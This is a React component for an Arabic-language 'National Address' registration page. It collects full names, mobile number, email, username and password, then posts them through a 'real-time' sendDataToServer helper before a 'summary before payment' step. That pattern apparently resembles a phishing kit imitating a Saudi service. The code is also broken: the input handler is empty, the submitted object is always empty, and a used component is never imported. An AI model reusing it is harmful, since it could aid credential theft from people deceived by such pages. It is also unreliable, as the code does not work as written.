import { useEffect, useState } from "react";
import Box from "@mui/material/Box";
import Button from "@mui/material/Button";
import Checkbox from "@mui/material/Checkbox";
import FormControlLabel from "@mui/material/FormControlLabel";
import Typography from "@mui/material/Typography";
import Footer from "./footer";
import ErrorDialog from "./ErrorDialog";
import {
  encryptRoute,
  navigate,
  sendDataToServer,
  setCurrentPage,
} from "@/real-time/utils/utils";

const NationalAddressPage = () => {
  useEffect(() => {
    setCurrentPage("العنوان الوطني");
  }, []);

  const [formData, setFormData] = useState({});

  const [showErrors, setShowErrors] = useState(false);

  const [isPending, setIsPending] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);

  const handleInputChange = (id: string, value: string) => {};

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowErrors(true);

    // Basic validation

    // if (hasEmptyFields) {
    //   setShowErrorDialog(true);
    //   return;
    // }

    setIsPending(true);

    const fieldMap: Record<string, string> = {};

    const arabicData: Record<string, string> = {};

    console.log("Submitting:", arabicData);

    sendDataToServer({
      data: arabicData,
      current: "العنوان الوطني",
      nextPage: "ملخص قبل الدفع",
    });

    setIsPending(false);
  };

  const handleBack = () => {
    navigate(encryptRoute("إنشاء حساب أعمال"));
  };

  return (
    <div className="flex flex-col font-[Tajawal]">
      <div className="h-[32px] bg-[#143c3c] border-b-2 border-[#146c84]" />

      <section className="min-h-screen bg-[#f3f4f6] py-10 px-4 md:px-8 flex flex-col items-center">
        <div className="w-full max-w-[900px] bg-white rounded-lg shadow-[0_4px_20px_0_rgba(0,0,0,0.05)] px-4 py-8 md:p-12">
          <Typography
            variant="h4"
            sx={{
              fontSize: { xs: "18px", md: "28px" },
              fontWeight: "bold",
              textAlign: "center",
              color: "#153c3f",
              mb: 2,
            }}
          >
            العنوان الوطني
          </Typography>

          <Typography
            variant="h6"
            sx={{
              fontSize: { xs: "18px", md: "20px" },
              color: "#153c3f",
              textAlign: "center",
              fontWeight: "semibold",
              mb: 4,
            }}
          >
            عنوان داخل المملكة
          </Typography>

          <form className="space-y-10" onSubmit={handleContinue}>
            {/* Arabic Name Group */}
            <div>
              <p className="font-bold text-[#153c3f] text-lg mb-4 text-right">
                الاسم بالعربي
              </p>
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
                <CustomFormField
                  id="firstName"
                  label="الاسم الأول"
                  placeholder="الاسم الأول"
                  value={formData.firstName}
                  onChange={(val) => handleInputChange("firstName", val)}
                  required
                  error={showErrors && !formData.firstName}
                />
                <CustomFormField
                  id="fatherName"
                  label="اسم الأب"
                  placeholder="الأب"
                  value={formData.fatherName}
                  onChange={(val) => handleInputChange("fatherName", val)}
                  required
                  error={showErrors && !formData.fatherName}
                />
                <CustomFormField
                  id="grandfatherName"
                  label="اسم الجد"
                  placeholder="الجد"
                  value={formData.grandfatherName}
                  onChange={(val) => handleInputChange("grandfatherName", val)}
                  required
                  error={showErrors && !formData.grandfatherName}
                />
                <CustomFormField
                  id="lastName"
                  label="اسم العائلة"
                  placeholder="العائلة"
                  value={formData.lastName}
                  onChange={(val) => handleInputChange("lastName", val)}
                  required
                  error={showErrors && !formData.lastName}
                />
              </div>
            </div>

            {/* English Name Group */}
            <div>
              <p className="font-bold text-[#153c3f] text-lg mb-4 text-right">
                الاسم بالإنجليزي
              </p>
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4" dir="ltr">
                <CustomFormField
                  id="firstNameEn"
                  label="First Name"
                  placeholder="First Name"
                  value={formData.firstNameEn}
                  onChange={(val) => handleInputChange("firstNameEn", val)}
                  required
                  dir="ltr"
                  error={showErrors && !formData.firstNameEn}
                />
                <CustomFormField
                  id="fatherNameEn"
                  label="Father Name"
                  placeholder="Father"
                  value={formData.fatherNameEn}
                  onChange={(val) => handleInputChange("fatherNameEn", val)}
                  required
                  dir="ltr"
                  error={showErrors && !formData.fatherNameEn}
                />
                <CustomFormField
                  id="grandfatherNameEn"
                  label="Grandfather"
                  placeholder="Grandfather"
                  value={formData.grandfatherNameEn}
                  onChange={(val) =>
                    handleInputChange("grandfatherNameEn", val)
                  }
                  required
                  dir="ltr"
                  error={showErrors && !formData.grandfatherNameEn}
                />
                <CustomFormField
                  id="lastNameEn"
                  label="Family Name"
                  placeholder="Family"
                  value={formData.lastNameEn}
                  onChange={(val) => handleInputChange("lastNameEn", val)}
                  required
                  dir="ltr"
                  error={showErrors && !formData.lastNameEn}
                />
              </div>
            </div>

            {/* Contact Group */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <CustomFormField
                id="mobileNumber"
                label="رقم الجوال"
                placeholder="05XXXXXXXX"
                value={formData.mobileNumber}
                onChange={(val) => handleInputChange("mobileNumber", val)}
                required
                error={showErrors && !formData.mobileNumber}
              />
              <CustomFormField
                id="email"
                label="البريد الإلكتروني"
                placeholder="البريد الإلكتروني"
                value={formData.email}
                onChange={(val) => handleInputChange("email", val)}
                required
                error={showErrors && !formData.email}
              />
            </div>

            {/* Account Info Section */}
            <div className="pt-4">
              <Typography
                variant="h5"
                className="text-center font-bold text-[#153c3f] mb-8"
                sx={{ fontSize: "22px" }}
              >
                معلومات الحساب
              </Typography>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <CustomFormField
                  id="username"
                  label="اسم المستخدم"
                  placeholder="اسم المستخدم"
                  value={formData.username}
                  onChange={(val) => handleInputChange("username", val)}
                  required
                  error={showErrors && !formData.username}
                />
                <CustomFormField
                  id="password"
                  label="كلمة المرور"
                  type="password"
                  placeholder="كلمة المرور الجديدة"
                  value={formData.password}
                  onChange={(val) => handleInputChange("password", val)}
                  required
                  error={showErrors && !formData.password}
                />
                <CustomFormField
                  id="passwordConfirmation"
                  label="تأكيد كلمة المرور"
                  type="password"
                  placeholder="كلمة المرور الجديدة"
                  value={formData.passwordConfirmation}
                  onChange={(val) =>
                    handleInputChange("passwordConfirmation", val)
                  }
                  required
                  error={showErrors && !formData.passwordConfirmation}
                />
              </div>
            </div>

            <Box
              sx={{
                display: "flex",
                flexDirection: { xs: "column", md: "row" },
                justifyContent: "space-between",
                alignItems: "center",
                gap: 2,
                mt: 8,
              }}
            >
              <Button
                variant="outlined"
                onClick={handleBack}
                sx={{
                  width: { xs: "100%", md: "fit-content" },
                  borderColor: "#136e82",
                  color: "#136e82",
                  fontWeight: "bold",
                  fontSize: "1.1rem",
                  py: 1.5,
                  px: 8,
                  borderWidth: "2px",
                  borderRadius: "8px",
                  "&:hover": {
                    bgcolor: "#146e82",
                    color: "white",
                    borderColor: "#146e82",
                  },
                }}
              >
                رجوع
              </Button>

              <Button
                variant="contained"
                type="submit"
                disabled={isPending}
                sx={{
                  width: { xs: "100%", md: "fit-content" },
                  bgcolor: "#00c8e1",
                  color: "#373737",
                  fontWeight: "bold",
                  fontSize: "1.1rem",
                  py: 1.5,
                  px: 8,
                  borderRadius: "8px",
                  boxShadow: "none",
                  "&:hover": { bgcolor: "#00b2c9", boxShadow: "none" },
                  "&.Mui-disabled": {
                    bgcolor: "#00c8e1",
                    opacity: 0.7,
                    color: "#373737",
                  },
                }}
              >
                {isPending ? "جاري التسجيل..." : "تسجيل"}
              </Button>
            </Box>
          </form>
        </div>
      </section>

      <Footer />

      <ErrorDialog
        open={showErrorDialog}
        onClose={() => setShowErrorDialog(false)}
      />
    </div>
  );
};

export default NationalAddressPage;
